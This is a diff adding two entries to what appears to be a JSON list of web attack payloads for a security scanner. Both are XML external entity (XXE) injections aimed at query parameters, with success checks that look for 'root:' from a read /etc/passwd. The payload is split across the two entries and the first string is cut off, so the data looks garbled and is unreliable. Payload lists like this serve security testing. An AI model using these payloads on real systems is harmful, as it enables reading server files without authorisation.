@@ -669,5 +669,27 @@
       "expected_status_code": 200,
       "success_regex": "root:|ENTITY|xml"
     }
+  },
+  {
+    "payload_id": "OWP-474752",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-474753",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
   }
 ]
